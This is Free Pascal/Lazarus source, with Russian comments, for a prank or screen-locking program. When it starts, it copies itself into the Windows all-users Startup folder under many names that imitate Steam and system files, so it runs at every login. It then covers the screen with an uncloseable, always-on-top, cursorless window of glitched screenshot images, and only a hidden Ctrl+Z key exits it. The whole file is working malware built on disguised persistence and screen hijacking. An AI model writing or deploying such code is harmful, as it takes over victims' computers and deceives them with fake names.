unit Unit1;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, Forms, Controls, Graphics, Dialogs, ExtCtrls;


type

  { TForm1 }

  TForm1 = class(TForm)
    Timer1: TTimer;
    procedure FormClose(Sender: TObject; var CloseAction: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FormPaint(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
   ScreenShot: TBitmap;
  public

  end;

var
  Form1: TForm1;

implementation

{$R *.lfm}

uses
  LCLType, LCLIntf, fileutil;



function TakeScreenshot: TBitmap;
var
  ScreenDC: HDC;
  ScreenBitmap: TBitmap;
begin
  Result := nil;
  ScreenDC := 0;
  // создаем ScreenBitmap для захвата экрана
  ScreenBitmap := TBitmap.Create;
  try
    // получаем контекст экрана
    ScreenDC := GetDC(0);
    // загружаем в ScreenBitmap скриншот экрана
    ScreenBitmap.LoadFromDevice(ScreenDC);
    // создаем Result для хранения скриншота, в "нативном" формате lcl.
    // т.к. на linux/osx формат изображения захваченного с помощью LoadFromDevice
    // может быть не "нативным" для lcl => его отрисовка может быть медленной.
    Result := TBitmap.Create;
    try
      // ресайзим Result под размер скриншота
      Result.SetSize(ScreenBitmap.Width, ScreenBitmap.Height);
      // отрисовываем скриншот на Result
      Result.Canvas.Draw(0, 0, ScreenBitmap);
    except
      // что-то пошло не так, уничтожаем Result, и перевозбуждаем исключение
      Result.Free;
      raise;
    end;
  finally
    ScreenBitmap.Free;
    ReleaseDC(0, ScreenDC);
  end;
end;


{ TForm1 }

procedure TForm1.FormClose(Sender: TObject; var CloseAction: TCloseAction);
begin
   CloseAction := caNone;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Steam.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\steamwebhelper.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Steam Web Helper.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Host.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SteamUpdate.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Update.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\UpdateSteam.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Update Steam.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\UpdateSteam.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\System Steam.exe');

  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\System.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\System32bhelper.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\System64.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Host64.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\HostUpdate.exe');
  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\UpdateHost.exe');
  Sleep(10000);
  // Снимок экрана
  ScreenShot := TakeScreenshot;


  // бордюр отключаем
  BorderStyle := bsNone;
  // Весь экран
  WindowState := wsFullScreen;
  // Поверх всех окон
  FormStyle := fsSystemStayOnTop;
  // Отключаем курсор
  Cursor := crNone;
  Color:= clBlack;



end;

procedure TForm1.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
begin
   if(Key = VK_Z) and (ssCtrl in Shift) then
      Halt;
end;

procedure TForm1.FormPaint(Sender: TObject);
var
  I, J: Integer;
  SpanX,SpanY, SpanHeight: Integer;

begin
  // Рисуем фон
  if Random(31) <> 0 then
    Canvas.Draw(Random(11) - 5, 0, Screenshot)
  else
  begin
    Canvas.Brush.Color := clFuchsia;
    Canvas.FillRect(0, 0, Screenshot.Width, Screenshot.Height);
  end;


  // Рисуем отрезки
  Canvas.Brush.Color:= clBlack;
  for I := 0 to 11 do
  begin
    SpanHeight:= 4 + Random(120);
    if Random(5) = 0 then
      SpanX := Random(121) - 60
    else
      SpanX := Random(31) - 15;
    SpanY := Random(Screenshot.Height);

    Canvas.FillRect(
      0, SpanY,
      ScreenShot.Width, SpanY + SpanHeight
    );

    BitBlt(
      Canvas.Handle, // Куда рисуем
      SpanX, SpanY,  // X and Y
      ScreenShot.Width, ScreenShot.Height, // Ширина и высота нарисованого куска
      ScreenShot.Canvas.Handle, // Откуда на рисован
      0, SpanY,
      cmSrcCopy
      );
  end;
   // глючные линии
  for J := 0 to Random(7) do
  begin
    SpanY := Random(Screenshot.Height);

    if Random(5) = 0 then
      Canvas.Pen.Color := clFuchsia
    else
      Canvas.Pen.Color := clLime;

    for I := 0 to Random(40) do
    begin
      if Random(3) = 0 then
        Canvas.Line(
          0, SpanY + I, // x1 y1
          Screenshot.Width, SpanY + I // x2 y2
        );
    end;
  end;

end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
   ShowOnTop;
   Invalidate;
end;

end.

